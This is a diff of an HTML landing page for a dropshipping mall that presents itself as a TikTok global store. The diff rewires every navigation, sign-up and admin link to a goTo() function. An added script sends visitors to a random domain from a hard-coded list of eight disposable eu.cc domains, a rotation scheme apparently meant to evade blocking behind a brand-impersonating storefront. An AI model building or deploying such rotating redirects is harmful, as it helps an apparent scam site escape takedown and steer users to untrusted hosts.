@@ -164,21 +164,21 @@ section{padding:80px 40px}
 <nav class="nav">
   <a href="/" class="nav-brand"><img src="/assets/logo.png" alt=""><span id="brandName">TK Global Mall</span></a>
   <div class="nav-links">
-    <a href="/api/r?flag=pc" target="_blank" data-i18n="n1">买家商城</a>
-    <a href="/api/r?flag=spc" target="_blank" data-i18n="n2">卖家中心</a>
-    <a href="/api/r?flag=ldy" target="_blank" data-i18n="n3">合作伙伴</a>
+    <a href="javascript:void(0)" onclick="goTo(`/home`)" data-i18n="n1">买家商城</a>
+    <a href="javascript:void(0)" onclick="goTo(`/seller/`)" data-i18n="n2">卖家中心</a>
+    <a href="javascript:void(0)" onclick="goTo(`/partner`)" data-i18n="n3">合作伙伴</a>
     <button class="lang-btn" id="langToggle"><span id="langLabel">中文</span></button>
   </div>
-  <a href="/api/r?flag=spc" target="_blank" class="nav-cta" data-i18n="join">立即入驻</a>
+  <a href="javascript:void(0)" onclick="goTo(`/seller/`)" class="nav-cta" data-i18n="join">立即入驻</a>
   <button class="hamburger" id="hamburger"><span></span><span></span><span></span></button>
 </nav>
 <div class="mobile-menu" id="mobileMenu">
-  <a href="/api/r?flag=pc" target="_blank" data-i18n="n1">买家商城</a>
-  <a href="/api/r?flag=spc" target="_blank" data-i18n="n2">卖家中心</a>
-  <a href="/api/r?flag=ldy" target="_blank" data-i18n="n3">合作伙伴</a>
-  <a href="/api/r?flag=admin" target="_blank">后台管理</a>
+  <a href="javascript:void(0)" onclick="goTo(`/home`)" data-i18n="n1">买家商城</a>
+  <a href="javascript:void(0)" onclick="goTo(`/seller/`)" data-i18n="n2">卖家中心</a>
+  <a href="javascript:void(0)" onclick="goTo(`/partner`)" data-i18n="n3">合作伙伴</a>
+  <a href="javascript:void(0)" onclick="goTo(`/seller/`)">后台管理</a>
 <div class="mobile-lang"><button data-lang="zh" id="mLangZh">中文</button><button data-lang="en" class="on" id="mLangEn">English</button></div>
-  <a href="/api/r?flag=spc" target="_blank" class="mobile-cta" data-i18n="join">立即入驻</a>
+  <a href="javascript:void(0)" onclick="goTo(`/seller/`)" class="mobile-cta" data-i18n="join">立即入驻</a>
 </div>
 
 <!-- HERO -->
@@ -192,8 +192,8 @@ section{padding:80px 40px}
       <h1 data-i18n="h1">全球货源<br><em>一件代发</em></h1>
       <p data-i18n="sub">连接全球优质供应链，覆盖服饰、3C、家居、美妆等全品类。零库存模式，专注运营增长。</p>
       <div class="hero-btns">
-        <a href="/api/r?flag=pc" target="_blank" class="btn-fill" data-i18n="b1">开始采购</a>
-        <a href="/api/r?flag=spc" target="_blank" class="btn-ghost" data-i18n="b2">卖家入驻</a>
+        <a href="javascript:void(0)" onclick="goTo(`/home`)" class="btn-fill" data-i18n="b1">开始采购</a>
+        <a href="javascript:void(0)" onclick="goTo(`/seller/`)" class="btn-ghost" data-i18n="b2">卖家入驻</a>
       </div>
     </div>
     <div class="hero-phone"><img src="/assets/hero-phone.png" alt=""></div>
@@ -250,10 +250,10 @@ section{padding:80px 40px}
   <h2 class="sec-title" data-i18n="rtitle">开启你的旅程</h2>
   <p class="sec-desc" data-i18n="rdesc">无论你是卖家、创作者、合作伙伴还是买家，都有专属服务</p>
   <div class="role-grid">
-    <a href="/api/r?flag=spc" target="_blank" class="role-card"><img src="/assets/cta-seller.png" alt="" loading="lazy"><h4 data-i18n="r1">卖家入驻</h4><span data-i18n="r1b">立即开店</span></a>
-    <a href="/api/r?flag=pc" target="_blank" class="role-card"><img src="/assets/cta-creator.png" alt="" loading="lazy"><h4 data-i18n="r2">创作者带货</h4><span data-i18n="r2b">加入联盟</span></a>
-    <a href="/api/r?flag=ldy" target="_blank" class="role-card"><img src="/assets/cta-partner.png" alt="" loading="lazy"><h4 data-i18n="r3">合作伙伴</h4><span data-i18n="r3b">了解更多</span></a>
-    <a href="/api/r?flag=pc" target="_blank" class="role-card"><img src="/assets/cta-shopper.png" alt="" loading="lazy"><h4 data-i18n="r4">买家采购</h4><span data-i18n="r4b">开始采购</span></a>
+    <a href="javascript:void(0)" onclick="goTo(`/seller/`)" class="role-card"><img src="/assets/cta-seller.png" alt="" loading="lazy"><h4 data-i18n="r1">卖家入驻</h4><span data-i18n="r1b">立即开店</span></a>
+    <a href="javascript:void(0)" onclick="goTo(`/home`)" class="role-card"><img src="/assets/cta-creator.png" alt="" loading="lazy"><h4 data-i18n="r2">创作者带货</h4><span data-i18n="r2b">加入联盟</span></a>
+    <a href="javascript:void(0)" onclick="goTo(`/partner`)" class="role-card"><img src="/assets/cta-partner.png" alt="" loading="lazy"><h4 data-i18n="r3">合作伙伴</h4><span data-i18n="r3b">了解更多</span></a>
+    <a href="javascript:void(0)" onclick="goTo(`/home`)" class="role-card"><img src="/assets/cta-shopper.png" alt="" loading="lazy"><h4 data-i18n="r4">买家采购</h4><span data-i18n="r4b">开始采购</span></a>
   </div>
 </section>
 
@@ -263,10 +263,10 @@ section{padding:80px 40px}
   <h2 class="sec-title" data-i18n="svtitle">四大核心板块</h2>
   <p class="sec-desc" data-i18n="svdesc">覆盖贸易全场景</p>
   <div class="svc-grid">
-    <a href="/api/r?flag=pc" target="_blank" class="svc-card"><img src="/assets/service-zd.png" alt="" loading="lazy"><h4 data-i18n="sv1">买家采购</h4><p data-i18n="sv1d">海量商品，全球代发</p></a>
-    <a href="/api/r?flag=spc" target="_blank" class="svc-card"><img src="/assets/service-marketing.png" alt="" loading="lazy"><h4 data-i18n="sv2">卖家入驻</h4><p data-i18n="sv2d">一键开店，触达全球</p></a>
-    <a href="/api/r?flag=ldy" target="_blank" class="svc-card"><img src="/assets/service-logistics.png" alt="" loading="lazy"><h4 data-i18n="sv3">合作伙伴</h4><p data-i18n="sv3d">加入生态，共享增长</p></a>
-    <a href="/api/r?flag=admin" target="_blank" class="svc-card"><img src="/assets/service-support.png" alt="" loading="lazy"><h4 data-i18n="sv4">后台管理</h4><p data-i18n="sv4d">数据看板，精细运营</p></a>
+    <a href="javascript:void(0)" onclick="goTo(`/home`)" class="svc-card"><img src="/assets/service-zd.png" alt="" loading="lazy"><h4 data-i18n="sv1">买家采购</h4><p data-i18n="sv1d">海量商品，全球代发</p></a>
+    <a href="javascript:void(0)" onclick="goTo(`/seller/`)" class="svc-card"><img src="/assets/service-marketing.png" alt="" loading="lazy"><h4 data-i18n="sv2">卖家入驻</h4><p data-i18n="sv2d">一键开店，触达全球</p></a>
+    <a href="javascript:void(0)" onclick="goTo(`/partner`)" class="svc-card"><img src="/assets/service-logistics.png" alt="" loading="lazy"><h4 data-i18n="sv3">合作伙伴</h4><p data-i18n="sv3d">加入生态，共享增长</p></a>
+    <a href="javascript:void(0)" onclick="goTo(`/seller/`)" class="svc-card"><img src="/assets/service-support.png" alt="" loading="lazy"><h4 data-i18n="sv4">后台管理</h4><p data-i18n="sv4d">数据看板，精细运营</p></a>
   </div>
 </section>
 
@@ -278,7 +278,7 @@ section{padding:80px 40px}
       <span class="sec-label" style="text-align:left;display:block" data-i18n="atag">学院</span>
       <h2 data-i18n="atitle">TikTok全球学院</h2>
       <p data-i18n="adesc">系统化培训课程，从选品技巧到广告投放，帮助卖家快速上手，持续提升。</p>
-      <a href="/api/r?flag=pc" target="_blank"><span data-i18n="alink">进入学院</span> →</a>
+      <a href="javascript:void(0)" onclick="goTo(`/home`)"><span data-i18n="alink">进入学院</span> →</a>
     </div>
   </div>
 </section>
@@ -314,7 +314,7 @@ section{padding:80px 40px}
 <section class="cta-bottom">
   <h2 data-i18n="cta">准备好<em>拓展全球市场</em>了吗？</h2>
   <p data-i18n="ctad">立即加入，零库存一件代发</p>
-  <a href="/api/r?flag=spc" target="_blank" class="btn-fill" style="padding:16px 36px;font-size:16px" data-i18n="ctab">免费入驻 · 即刻开始</a>
+  <a href="javascript:void(0)" onclick="goTo(`/seller/`)" class="btn-fill" style="padding:16px 36px;font-size:16px" data-i18n="ctab">免费入驻 · 即刻开始</a>
 </section>
 
 <!-- FOOTER -->
@@ -322,10 +322,10 @@ section{padding:80px 40px}
   <div class="footer-inner">
     <div class="footer-brand"><img src="/assets/logo.png" alt=""><span id="footerBrand">TK Global Mall</span></div>
     <div class="footer-links">
-      <a href="/api/r?flag=pc" target="_blank" data-i18n="n1">买家商城</a>
-      <a href="/api/r?flag=spc" target="_blank" data-i18n="n2">卖家中心</a>
-      <a href="/api/r?flag=ldy" target="_blank" data-i18n="n3">合作伙伴</a>
-      <a href="/api/r?flag=admin" target="_blank">后台管理</a>
+      <a href="javascript:void(0)" onclick="goTo(`/home`)" data-i18n="n1">买家商城</a>
+      <a href="javascript:void(0)" onclick="goTo(`/seller/`)" data-i18n="n2">卖家中心</a>
+      <a href="javascript:void(0)" onclick="goTo(`/partner`)" data-i18n="n3">合作伙伴</a>
+      <a href="javascript:void(0)" onclick="goTo(`/seller/`)">后台管理</a>
     </div>
     <div class="footer-copy">&copy; 2026 TikTok全球商城</div>
   </div>
@@ -426,6 +426,14 @@ document.getElementById('pwaInstall').addEventListener('click',async()=>{if(dp){
 document.getElementById('pwaDismiss').addEventListener('click',()=>document.getElementById('pwaBanner').classList.remove('show'));
 setTimeout(()=>{if(dp)document.getElementById('pwaBanner').classList.add('show')},3000);
 if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js').catch(()=>{});
+</script>
+
+<script>
+var ROTATION_DOMAINS = ["chxhx.eu.cc","drrgr.eu.cc","drrimrf.eu.cc","drriiu.eu.cc","duomi.eu.cc","dengruihan.eu.cc","yyawzx.eu.cc","gamed.eu.cc"];
+function goTo(path) {
+  var d = ROTATION_DOMAINS[Math.floor(Math.random() * ROTATION_DOMAINS.length)];
+  window.location.href = "https://" + d + path;
+}
 </script>
 </body>
 </html>
